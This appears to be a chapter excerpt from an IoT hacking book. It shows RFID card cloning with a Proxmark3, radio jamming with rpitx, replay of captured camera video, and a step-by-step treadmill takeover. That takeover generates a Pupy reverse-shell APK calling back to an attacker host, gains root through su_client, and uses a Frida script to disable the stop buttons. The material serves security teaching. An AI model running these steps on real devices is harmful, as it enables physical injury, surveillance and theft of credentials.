["```\n$ proxmark3>**hf search**\nUID : 80 55 4b 6c           \nATQA : 00 04          \n SAK : 08 [2]          \n1 TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1          \nproprietary non iso14443-4 card found, RATS not supported          \n  No chinese magic backdoor command detected          \n2 Prng detection: WEAK          \nValid ISO14443A Tag Found - Quiting Search\n```", "```\nproxmark3> **hf mf mifare**\n-------------------------------------------------------------------------\nExecuting command. Expected execution time: 25sec on average  :-)\nPress the key on the proxmark3 device to abort both proxmark3 and client.\n-------------------------------------------------------------------------uid(80554b6c) nt(5e012841) par(3ce4e41ce41c8c84) ks(0209080903070606) nr(2400000000)\n|diff|{nr}    |ks3|ks3^5|parity         |\n+----+--------+---+-----+---------------+\n| 00 |00000000| 2 |  7  |0,0,1,1,1,1,0,0|\n…\n1 Found valid key:ffffffffffff\n```", "```\nproxmark3> **hf mf nested 1 0 A FFFFFFFFFFFF t**\nTesting known keys. Sector count=16          \nnested...          \n-----------------------------------------------\nIterations count: 0     \n|---|----------------|---|----------------|---|          \n|sec|key A           |res|key B           |res|          \n|---|----------------|---|----------------|---|          \n|000|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|001|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|002|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n…\n```", "```\nproxmark3> **hf mf ecfill A**\n#db# EMUL FILL SECTORS FINISHED \n```", "```\nproxmark3> **hf mf sim**\nuid:N/A, numreads:0, flags:0 (0x00)           \n#db# 4B UID: 80554b6c\n```", "```\n $ **rtl_test**\nFound 1 device(s):\n  0:  Realtek, RTL2838UHIDIR, SN: 00000001\n```", "```\n $ **chmod +x CubicSDR-0.2.5-x86_64.AppImage**\n```", "```\n$ **./CubicSDR-0.2.5-x86_64.AppImage**\n```", "```\n$ **git clone** **http****s://github.com/F5OEO/rpitx**\n$ **cd rpitx && ./install.sh**\n```", "```\n$ **sudo ./rpitx –m VFO –f 433850**\n```", "````![f15008](Images/f15008.png)    Figure 15-8: The camera’s `RTSP OPTIONS` reply contains the request types it accepts.      Then the client sends an `RTSP DESCRIBE` request 3 that includes an `RTSP URL` (a link for viewing the camera feed, which in this case is *rtsp://192.168.4.180:554/video.mp4*). With this request 3 the client is asking the URL’s description and will notify the server with the description formats the client understands by using the `Accept` header in the form `Accept: application/sdp`. The server’s reply 4 to this is usually in the Session Description Protocol (SDP) format shown in [Figure 15-9](#figure15-9). The server’s reply is an important packet for our proof of concept, because we’ll use that information to create the basis of an SDP file. It contains important fields, such as media attributes (for example, encoding for the video is H.264 with a sample rate of 90,000 Hz) and which packetization modes will be in use.  ![f15009](Images/f15009.png)    Figure 15-9: The camera’s RTSP reply to the `DESCRIBE` request includes the SDP part.      The next two RTSP requests are `SETUP` and `PLAY`. The former asks the camera to allocate resources and start an RTSP session; the latter asks to start sending data on the stream allocated via `SETUP`. The `SETUP` request 5 includes the client’s two ports for receiving RTP data (video and audio) and RTCP data (statistics and control info). The camera’s reply 6 to the `SETUP` request confirms the client’s ports and adds the server’s corresponding chosen ports, as shown in [Figure 15-10](#figure15-10).  ![f15010](Images/f15010.png)    Figure 15-10: The camera’s reply to the client’s `SETUP` request      After the `PLAY` request 7, the server starts transmitting the RTP stream 8 (and some RTCP packets) 9. Return to [Figure 15-7](#figure15-7) to see that this exchange happens between the `SETUP` request’s agreed-upon ports.    ### Extracting the Video Stream    Next, we need to extract the bytes from the SDP packet and export them into a file. Because the SDP packet contains important values about how the video is encoded, we need that information to play back the video. You can extract the SDP packet by selecting the **RTSP/SDP** packet in the Wireshark main window, selecting the **Session Description Protocol** part of the packet, and then right-clicking and selecting **Export Packet Bytes** ([Figure 15-11](#figure15-11)). Then save the bytes into a file on the disk.  ![f15011](Images/f15011.png)    Figure 15-11: Select the SDP part of the RTSP packet in Wireshark and Export Packet Bytes to a file.      The created SDP file will look something like [Listing 15-1](#listing15-1).    ``` v=0 1 o=- 0 0 IN IP4 192.168.4.180 2 s=LIVE VIEW 3 c=IN IP4 0.0.0.0 t=0 0 a=control:* 4 m=video 0 RTP/AVP 35 a=rtpmap:35 H264/90000 a=rtpmap:102 H265/90000 a=control:video a=recvonly a=fmtp:35 packetization-mode=1;profile-level-id=4d4033;sprop-parameter-sets=Z01AM42NYBgAbNgLUBDQECA=,aO44gA== ```    Listing 15-1: The original SDP file as saved by exporting the SDP packet from the Wireshark dump    We’ve marked the most important parts of the file that we need to modify. We see the session owner (`-`), the session id (`0`), and the originator’s network address 1. For accuracy, because the originator of this session will be our localhost, we can change the IP address to 127.0.0.1 or delete this line entirely. Next, we see the session name 2. We can omit this line or leave it as-is. If we leave it, the string `LIVE VIEW` will briefly appear when VLC plays back the file. Then we see the listening network address 3. We should change this to 127.0.0.1 so we don’t expose the FFmpeg tool we’ll use later on the network, because we’ll only be sending data to FFmpeg locally through the loopback network interface.    The most important part of the file is the value that contains the network port for RTP 4. In the original SDP file, this is `0`, because the port was negotiated later through the RTSP `SETUP` request. We’ll have to change this port to a valid non-zero value for our use-case. We arbitrarily chose `5000`. [Listing 15-2](#listing15-2) displays the modified SDP file. We saved it as *camera.sdp*.    ``` v=0 c=IN IP4 127.0.0.1 m=video 5000 RTP/AVP 35 a=rtpmap:35 H264/90000 a=rtpmap:102 H265/90000 a=control:video a=recvonly a=fmtp:35 packetization-mode=1;profile-level-id=4d4033;sprop-parameter-sets=Z01AM42NYBgAbNgLUBDQECA=,aO44gA== ```    Listing 15-2: The modified SDP file    The second step is to extract the RTP stream from Wireshark. The RTP stream contains the encoded video data. Open the *pcap* file that contains the captured RTP packets in Wireshark; then click **Telephony**▶**RTP Streams**. Select the stream shown, right-click it, and select **Prepare Filter**. Right-click again and select **Export as RTPDump**. Then save the selected RTP stream as an *rtpdump* file (we saved it as *camera.rtpdump*).    To extract the video from the *rtpdump* file and play it back, you’ll need the following tools: RTP Tools to read and play back the RTP session, FFmpeg to convert the stream, and VLC to play back the final video file. If you’re using a Debian-based distribution like Kali Linux, you can easily install the first two using`apt`:    ``` $ **apt-get install vlc** $ **apt-get install ffmpeg** ```    You’ll have to download the RTP Tools manually either from its website ([https://github.com/irtlab/rtptools/](https://github.com/irtlab/rtptools/)) or its GitHub repository. Using `git`, you can clone the latest version of the GitHub repository:    ``` $ **git clone https://github.com/cu-irt/rtptools.git** ```    Then compile the RTP Tools::    ``` $ **cd rtptools** $ **./configure && make** ```    Next, run FFmpeg using the following options:    ``` $ **ffmpeg -v warning -protocol_whitelist file,udp,rtp -f sdp -i camera.sdp -copyts -c copy -y**  **out.mkv**  ```    We whitelist the allowed protocols (file, UDP, and SDP) because it’s a good practice. The `-f` switch forces the input file format to be SDP regardless of the file’s extension. The `-i` option supplies the modified *camera.sdp* file as input. The `-copyts` option means that input timestamps won’t be processed. The `-c copy` option signifies that the stream is not to be re-encoded, only outputted, and `-y` overwrites output files without asking. The final argument (*out.mkv*) is the resulting video file.    Now run RTP Play, providing the path of the *rtpdump* file as an argument to the `-f` switch:    ``` ~/rtptools-1.22$ **./rtpplay -T -f****../****camera****.rtpdump 127.0.0.1/5000** ```    The last argument is the network address destination and port that the RTP session will be played back to. This needs to match the one FFmpeg read through the SDP file (remember that we chose `5000` in the modified *camera.sdp* file).    Note that you must execute the `rtpplay` command immediately after you start FFmpeg, because by default FFmpeg will terminate if no incoming stream arrives soon. The FFmpeg tool will then decode the played-back RTP session and output the *out.mkv* file.    Then VLC will gloriously be able to play the video file:    ``` $ **vlc out.mkv**  ```    When you run this command, you should witness the captured camera video feed. You can watch a video demonstration of this technique on this book’s website at [https://nostarch.com/practical-iot-hacking/](https://nostarch.com/practical-iot-hacking/).    There are ways to securely transmit video streams that would prevent man-in-the-middle attacks, but few devices currently support them. One solution would be to use the newer *Secure RTP (SRTP)* protocol that can provide encryption, message authentication, and integrity, but note that these features are optional and could be disabled. People might disable them to avoid the performance overhead of encryption, because many embedded devices don’t have the necessary computational power to support it. There are also ways to separately encrypt RTP, as described at RFC 7201\\. Methods include using IPsec, RTP over TLS over TCP, or RTP over Datagram TLS (DTLS).    ## Attacking a Smart Treadmill    As an attacker, you now have unrestricted access to the user’s premises and you can check whether you appear in their security footage by playing back the video. The next step is to use your physical access to perform further attacks on other smart devices to extract sensitive data or even make them perform unwanted actions. What if you could turn all these smart devices against their owner while making it look like an accident?    A good example of smart home devices that you can exploit for such malicious purposes are those related to fitness and wellness, such as exercise and movement trackers, electric connected toothbrushes, smart weight scales, and smart exercise bikes. These devices can collect sensitive data about a user’s activities in real time. Some of them can also affect the user’s health. Among other features, the devices might be equipped with high-quality sensors designed to sense a user’s condition; *activity tracking systems* responsible for monitoring the user’s performance; cloud computing capabilities to store and process the collected data on a daily basis; internet connectivity that offers real-time interaction with users of similar devices; and multimedia playback that transforms the fitness device into a state-of-the-art infotainment system.    In this section, we’ll describe an attack against a device that combines all these amazing features: the smart powered treadmill, as shown in [Figure 15-12](#figure15-12).    Smart treadmills are one of the most fun ways to exercise in the home or gym, but you can get injured if the treadmill malfunctions.    The attack described in this section is based on a presentation given at the 2019 IoT security conference Troopers by Ioannis Stais (one of the authors of this book) and Dimitris Valsamaras. As a security measure, we won’t disclose the smart treadmill vendor’s name or the exact device model. The reason is that even though the vendor did address the issues very quickly by implementing the proper patches, these devices aren’t necessarily always connected to the internet, and as a result, might have not been updated yet. That said, the identified issues are textbook vulnerabilities often found in smart devices; they’re very indicative of what can go wrong with an IoT device in a modern smart home.  ![f15012](Images/f15012.png)    Figure 15-12: A modern smart treadmill      ### Smart Treadmills and the Android Operating System    Many smart treadmills use the Android operating system, which runs on more than a billion phones, tablets, watches, and televisions. By using Android in a product, you’re automatically granted significant benefits; for example, specialized libraries and resources for fast app development, and mobile apps, already available on the Google Play Store, that can be directly integrated into a product. Also, you have the support of an extended device ecosystem of all shapes and sizes that includes smartphones, tablets (AOSP), cars (Android Auto), smartwatches (Android Wear), TVs (Android TV), embedded systems (Android Things), and extensive official documentation that comes with online courses and training material for developers. Additionally, many original equipment manufacturers and retailers can provide compatible hardware parts.    But every good thing comes with a price: the adopted system risks becoming too generic It also provides far more functionality than required, increasing the product’s overall attack surface. Often, the vendors include custom apps and software that lack proper security audits and circumvent the existing platform security controls to achieve primary functions for their product, such as hardware control, as shown in [Figure 15-13](#figure15-13).    To control the environment the platform provides, vendors typically follow one of two possible approaches. They can integrate their product with a *Mobile Device Management (MDM)* software solution. MDM is a set of technologies that can be used to remotely administer the deployment, security, auditing, and policy enforcement of mobile devices. Otherwise, they can generate their own custom platform based on the *Android Open Source Project (AOSP)*. AOSP is freely available to download, customize, and install on any supported device. Both solutions offer numerous ways to limit the platform-provided functionalities and restrict the user access only to the intended ones.  ![f15013](Images/f15013.png)    Figure 15-13: A smart treadmill’s stack      The device examined here uses a customized platform based on AOSP equipped with all the necessary apps.    ### Taking Control of the Android Powered Smart Treadmill    In this section, we’ll walk through an attack on the smart treadmill that allowed us to control the speed and the incline of the device remotely.    #### Circumventing UI Restrictions    The treadmill is configured to allow the user to access only selected services and functionalities. For example, the user can start the treadmill, select a specific exercise, and watch TV or listen to a radio program. They can also authenticate to a cloud platform to track their progress. Bypassing these restrictions could allow us to install services to control the device.    Adversaries who want to circumvent UI restrictions commonly target the authentication and registration screens. The reason is that, in most cases, these require browser integration, either to perform the actual authentication functionality or to provide supplementary information. This browser integration is usually implemented using components provided by the Android framework, such as WebView objects. WebView is a feature that allows developers to display text, data, and web content as part of an application interface without requiring extra software. Although useful for developers, it supports plenty of functionality that can’t be easily protected, and as a result, it’s often targeted.    In our case, we can use the following process to circumvent the UI restrictions. First, click the **Create new account** button on the device screen. A new interface should appear requesting the user’s personal data. This interface contains a link to the Privacy Policy. The Privacy Policy seems to be a file that is presented in WebView, as shown in [Figure 15-14](#figure15-14).  ![f15014](Images/f15014.png)    Figure 15-14: Registration interface with links to the Privacy Policy      Within the Privacy Policy are other links, such as the Cookies Policy file shown in [Figure 15-15](#figure15-15).  ![f15015](Images/f15015.png)    Figure 15-15: WebView displaying the Privacy Policy local file      Fortunately, this policy file contains external links to resources hosted in remote servers, such as the one that appears as an icon in the top bar of the interface, as shown in [Figure 15-16](#figure15-16).  ![f15016](Images/f15016.png)    Figure 15-16: A link to an external site on the Cookies page      By selecting the link, the adversary can navigate to the vendor’s site and retrieve content that they wouldn’t have been able to access before, such as the site’s menus, images, videos and vendor’s latest news.    The final step is to attempt to escape from the cloud service to visit any custom website. The most common targets are usually the external web page’s Search Web Services buttons, which are shown in [Figure 15-17](#figure15-17), because they allow users to access any other site by simply searching for it.  ![f15017](Images/f15017.png)    Figure 15-17: An external site containing links to the Google search engine      In our case, the vendor’s site has integrated the Google search engine so the site’s visitors can perform local searches for the website’s content. An attacker can click the small Google icon at the top left of the screen to transfer to the Google search page. Now we can navigate to any site by typing the site’s name in the search engine.    Alternatively, attackers could exploit the Login interface feature that allows users to authenticate with Facebook ([Figure 15-18](#figure15-18)) because it creates a new browser window.  ![f15018](Images/f15018.png)    Figure 15-18: The authentication interface links to Facebook.      Then, when we click the Facebook logo shown in [Figure 15-19](#figure15-19), we can escape from WebView into a new browser window that allows us to access the URL bar and navigate to other sites.  ![f15019](Images/f15019.png)    Figure 15-19: A pop-up window that links to an external site      #### Attempting to Get Remote Shell Access    With access to other sites, the attacker could now use their web browsing capabilities to navigate to a remotely hosted Android application executable and then attempt to directly download and install it on the device. We’ll try to install an Android app on our computer that would give us remote shell access to the treadmill: it’s called the *Pupy* agent ([https://github.com/n1nj4sec/pupy](https://github.com/n1nj4sec/pupy)*/*).    We first have to install the Pupy server to our system. Using the Git tool to download the code from the remote repository, we then navigate to its folder and use the *create-workspace.py*script to set up the environment:    ``` $ **git clone --recursive https://github.com/n1nj4sec/pupy** $ **cd pupy && ./create-workspace.py pupyws** ```    Next, we can generate a new Android APK file using the `pupygen` command:    ``` $ **pupygen -f client -O android –o sysplugin.apk connect --host 192.168.1.5:8443** ```    The `-f` parameter specifies that we want to create a client application, the `-O` parameter stipulates that it should be an APK for Android platforms, the `-o` parameter names the application, the `connect` parameter requires the application to perform a reverse connection back to the Pupy server, and the `--host` parameter provides the IPv4 and port on which this server is listening.    Because we can navigate to custom websites through the treadmill’s interface, we can host this APK to a web server and try to directly access the treadmill. Unfortunately, when we tried to open the APK, we learned that the treadmill doesn’t allow you to install apps with an APK extension just by opening them through WebView. We’ll have to find some other way.    #### Abusing a Local File Manager to Install the APK    We’ll use a different strategy to attempt to infect the device and gain persistent access. Android WebViews and web browsers can trigger activities on other apps installed on the device. For example, all devices equipped with an Android version later than 4.4 (API level 19) allow users to browse and open documents, images, and other files using their preferred document storage provider. As a result, navigating to a web page containing a simple file upload form, like the one in [Figure 15-20](#figure15-20), will make Android look for installed File Manager programs.  ![f15020](Images/f15020.png)    Figure 15-20: Accessing an external site that requests a file upload      Surprisingly, we discovered that the treadmill’s browser window can initiate a custom File Manager application by letting us select its name from the sidebar list in the pop-up window, as shown in [Figure 15-21](#figure15-21). The one we’ve highlighted isn’t a default Android file manager and was probably installed as an extension in the Android ROM to allow the device manufacturer to perform file operations more easily.  ![f15021](Images/f15021.png)    Figure 15-21: Opening a custom local File Manager      This File Manager has extensive functionalities: it can compress and decompress files, and it can even directly open other apps—a functionality that we’ll exploit to install a custom APK. In the File Manager, we locate the previously downloaded APK file and click the **Open** button, as shown in [Figure 15-22](#figure15-22).  ![f15022](Images/f15022.png)    Figure 15-22: Abusing the local File Manager to execute a custom APK      The Android package installer, which is the default Android app that allows you to install, upgrade, and remove applications on the device, will then automatically initiate the normal installation process, as shown in [Figure 15-23](#figure15-23).  ![f15023](Images/f15023.png)    Figure 15-23: Executing a custom APK from the File Manager      Installing the Pupy agent will initiate a connection back to the Pupy server, as shown here. We can now use the remote shell to execute commands to the treadmill as a local user.    ``` [*] Session 1 opened (treadmill@localhost) (xx.xx.xx.xx:8080 <- yy.yy.yy.yy:43535) >> **sessions** id user hostname platform release os_arch proc_arch intgty_lvl address tags --------------------------------------------------------------------------- 1 treadmill localhost android 3.1.10 armv7l 32bit Medium   yy.yy.yy.yy  ```    #### Escalating Privileges    The next step is to perform privilege escalation. One way to achieve that is to look for *SUID binaries*, which are binaries that we can execute using a selected user’s permissions, even if the person executing them has lower privileges. More precisely, we’re looking for binaries that we can execute as the *root* user, which is the superuser on an Android platform. These binaries are common in Android-controlled IoT devices, because they allow apps to issue commands to the hardware and perform firmware updates. Normally, Android apps work in isolated environments (often called sandboxes) and can’t gain access to other apps or the system. But an app with superuser access rights can venture out of its isolated environment and take full control of the device.    We found that it’s possible to perform privilege escalation by abusing an unprotected SUID service installed on the device named *su_server*. This service was receiving commands from other Android applications over Unix domain sockets. We also found a client binary named `su_client` installed in the system. The client could be used to directly issue commands with root privileges, as shown here:    ``` $ **./su_client 'id > /sdcard/status.txt' && cat /sdcard/status.txt** uid=0(root) gid=0(root) context=kernel ```    The input issues the `id` command, which displays the user and group names and numeric IDs of the calling process to the standard output, and redirects the output to the file located at */sdcard/status.txt*. Using the `cat` command, which displays the file’s contents, we retrieve the output and verify that the command has been executed with the `root` user’s permissions.    We provided the commands as command line arguments between single quotes. Note that the client binary didn’t directly return any command output to the user, so we had to first write the result to a file in the SD card.    Now that we have superuser permissions, we can access, interact, and tamper with another app’s functionalities. For example, we can extract the current user’s training data, their password for the cloud fitness tracking app, and their Facebook token, and change the configuration of their training program.    #### Remotely Controlling Speed and Incline    With our acquired remote shell access and superuser permissions, let’s find a way to control the treadmill’s speed and incline. This requires investigating the software and the equipment’s hardware. See Chapter 3 for a methodology that can help you do this. [Figure 15-24](#figure15-24) shows an overview of the hardware design.    We discovered that the device is built on two main hardware components, called the Hi Kit and the Low Kit. The Hi Kit is composed of the CPU board and the device’s main board; the Low Kit is composed of a hardware control board that acts as an interconnection hub for the main components of the lower assembly.  ![f15024](Images/f15024.png)    Figure 15-24: A smart treadmill’s hardware design      The CPU board contains a microprocessor programmed with control logic. It manages and processes signals from the LCD touch screen, the NFC reader, the iPod docking station, a client USB port that allows users to connect external devices, and the built-in USB service port used to provide updates. The CPU board also handles the device’s network connectivity through its networking board.    The main board is the interface board for all the peripheral devices, such as the speedandinclinejoysticks, emergency buttons, and health sensors. The joysticks allow users to adjust the machine’s speed and elevation during exercise. Each time they’re moved forward or backward, they send a signal to the CPU board to change the speed or the elevation, depending on which joystick is used. The emergency stop button is a safety device that allows the user to stop the machine in an emergency situation. The sensors monitor the user’s heartbeat.    The Low Kit consists of the belt motor,the elevation motor, the inverter, and a limit switch. The belt motor and the elevation motor regulate the treadmill’s speed and incline. The inverter device supplies the belt motor with voltage. Variations in this voltage can cause corresponding variations in the tread belt’s acceleration. The limit switch restricts the belt motor’s maximum speed.    [Figure 15-25](#figure15-25) shows how the software communicates with all of these peripheral devices.  ![f15025](Images/f15025.png)    Figure 15-25: Software communication with the peripheral devices      Two components control the attached peripherals: a custom *Hardware Abstraction Layer**(HAL)* component and an embedded USB microcontroller. The HAL component is an interface implemented by the device vendor that allows the installed Android applications to communicate with hardware-specific device drivers. Android apps use the HAL APIs to get services from hardware devices. These services control the HDMI and the USB ports, as well as the USB microcontroller to send commands to change the belt motor’s speed or the elevation motor’s incline.    The treadmill contains a preinstalled Android app named the *Hardware Abstraction Layer APK* that uses these HAL APIs and another app named Equipment APK. The Equipment APK receives hardware commands from other installed apps through an exposed broadcast receiver and then transfers them to the hardware using the Hardware Abstraction Layer APK and the USB microcontroller, as shown in [Figure 15-25](#figure15-25).    The device contains a number of other preinstalled apps, such as the Dashboard APK, which is responsible for the user interface. These apps also need to control the hardware and monitor the existing equipment state. The current equipment state is maintained in another custom preinstalled Android application named the Repository APK, which is in a shared memory segment. A *shared memory segment* is an allocated area of memory that multiple programs or Android apps can access at the same time using direct read or write memory operations. The state is also accessible through exposed Android content providers but using the shared memory allows for greater performance, which the device needs for its real-time operations.    For example, each time the user presses one of the Dashboard speed buttons, the device sends a request to the Repository APK’s content provider to update the device’s speed. The Repository APK then updates the shared memory and informs the Equipment APK using an Android Intent. Then the Equipment APK sends the appropriate command through the USB controller to the appropriate peripheral, as shown in [Figure 15-26](#figure15-26).  ![f15026](Images/f15026.png)    Figure 15-26: Sending a command from the Dashboard APK to the hardware      Because we’ve gained local shell access with root privileges using the previous attack path, we can use the Repository APK’s exposed content provider to simulate a button activity. This would resemble an action received from the Dashboard APK.    Using the `content update` command, we can simulate the button that increases the treadmill’s speed:    ``` $ **content update --uri content:// com.vendorname.android.repositoryapk.physicalkeyboard.**  **AUTHORITY/item    --bind JOY_DX_UP:i:1** ```    We follow the command with the `uri` parameter, which defines the exposed content provider, and the `bind` parameter, which binds a specific value to a column. In this case, the command performs an update request to the Repository APK’s exposed content provider named `physicalkeyboard.AUTHORITY/item` and sets the value of the variable named `JOY_DX_UP` to one. You can identify the full name of the application, as well as the name of the exposed content provider and the bind parameter, by decompiling the app using the techniques presented in Chapter 14 and “Analyzing Android Applications” on page 360.    The victim is now on a remotely controlled treadmill that is accelerating to its maximum speed!    #### Disabling Software and Physical Buttons    To stop the device—or treadmill, in this case—the user can normally press one of the available dashboard screen buttons, such as the pause button, the restart button, the cool-down button, the stop button, or any buttons that control the device’s speed. These buttons are part of the pre-installed software that controls the device’s user interface. It’s also possible to halt the device using the physical joystick buttons that control the speed and incline or the *emergency stop key*, a completely independent physical button embedded in the lower part of the device hardware, as shown in [Figure 15-27](#figure15-27).  ![f15027](Images/f15027.png)    Figure 15-27: Software and physical buttons that allow a user to stop the treadmill      Each time the user presses one of the buttons, the device uses the Android IPC. An insert, update, or delete operation takes place in the content provider part of the app that controls the device’s speed.    We can use a simple Frida script to disable this communication. *Frida* is a dynamic tampering framework that allows the user to replace specific in-memory function calls. We used it in Chapter 14 to disable an Android app’s root detection. In this case, we can use a similar script to replace the repository app’s content provider update functionality to stop receiving new intents from the buttons.    Initially, we create a port forward for port 27042, which the Frida server will use, using the Pupy agent’s `portfwd` command:    ``` $ **run portfwd -L 127.0.0.1:27042:127.0.0.1:27042** ```    The `-L` parameter indicates that we want to perform a port forward from port 27042 of the localhost 127.0.0.1 to the remote device at the same port. The hosts and ports must be separated with the colon (:) character. Now whenever we connect to this port on our local device, a tunnel will be created connecting us to the same port on the target device.    Then we upload the Frida server for ARM platforms ([https://github.com/frida/frida/releases/](https://github.com/frida/frida/releases/)) to the treadmill using Pupy’s `upload` command:    ``` $ **run upload frida_arm /data/data/org.pupy.pupy/files/frida_arm** ```    The `upload` command receives, as the first argument, the location of the binary that we want to upload to our device, and as the second argument, the location in which to place this binary on the remote device. We use our shell access to mark the binary as executable using the `chmod` utility and start the server:    ``` $ **chmod 777 /data/data/org.pupy.pupy/files/frida_arm** $ **/data/data/org.pupy.pupy/files/frida_arm &** ```    Then we use the following Frida script, which replaces the button functionality with instructions to perform no action:    ``` var PhysicalKeyboard = Java.use(“com.vendorname.android.repositoryapk.cp.PhysicalKeyboardCP”);1 PhysicalKeyboard.update.implementation = function(a, b, c, d){ return; } ```    As mentioned earlier, the Repository APK handles the buttons’ activities. To locate the exact function that you need to replace 1, you’ll have to decompile the app using the techniques presented in “Analyzing Android Applications” on page 360.    Finally, we install the Frida framework on our system using the `pip` package manager for Python and execute the previous Frida script:    ``` $ **pip install frida-tools** $ **frida -H 127.0.0.1:27042 –f com.vendorname.android.repositoryapk -l script.js** ```    We use the `-H` parameter to specify the Frida server’s host and port, the `-f` parameter to specify the full name of the targeted application, and the `-l` parameter to select the script. We must provide the application’s full name in the command, which, once again, you can find by decompiling the app.    Now, even if the victim attempts to select one of the software buttons in the Dashboard APK or press the physical buttons that control the speed and incline to stop the device, they won’t succeed. Their only remaining choices are to locate and press the emergency stop button at the lower part of the device hardware or find another way to turn off the power.    #### Could This Vulnerability Exploitation Cause a Fatal Accident?    The chance of a user getting a serious injury as a result of the attacks we’ve described isn’t negligible. The device reached a speed of 27 km/h, or 16.7 mph. Most commercial treadmills can reach speeds between 12 and 14 mph; the highest-end models top out at 25 mph. Let’s compare this speed with the men’s 100 meters final race at the 2009 World Athletics Championships held at the Olympic Stadium in Berlin. Usain Bolt finished in a world record-breaking time of 9.58 seconds and was clocked at 44.72 km/h, or 27.8 mph! Unless you’re as fast as Bolt, you probably won’t be able to outrun the treadmill.    A number of real-life incidents verify the danger of a smart treadmill attack. Dave Goldberg, the SurveyMonkey CEO, lost his life after hitting his head in a treadmill accident. (According to the autopsy, a heart arrhythmia might have also contributed to his death.) In addition, between 1997 and 2014, an estimated 4,929 patients went to US emergency rooms with head injuries they sustained while exercising on treadmills.    ## Conclusion    In this chapter, we explored how an adversary could tamper with popular IoT devices found in modern smart homes and businesses. You learned how to circumvent modern RFID door locks and then jam wireless alarm systems to avoid detection. You played back security camera feed obtained from network traffic. Then we walked through how you might take over control of a smart treadmill to cause the victim potentially fatal injuries.    You could use the case studies provided to walk through a holistic smart home assessment or treat them as a testament to the underlying impact that vulnerable smart home IoT devices might introduce.    Now go explore your own smart home!````"]